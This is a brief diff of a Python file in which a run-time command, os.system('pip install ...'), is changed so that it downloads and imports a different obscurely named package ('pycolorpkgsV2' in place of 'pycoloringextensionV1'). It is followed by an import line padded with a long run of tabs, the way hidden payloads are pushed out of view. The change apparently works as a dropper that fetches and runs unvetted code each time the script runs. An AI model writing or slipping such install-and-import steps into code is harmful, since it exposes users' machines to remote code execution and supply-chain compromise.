@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycoloringextensionV1")
-import pycoloringextensionV1
+os.system("pip install pycolorpkgsV2")
+import pycolorpkgsV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
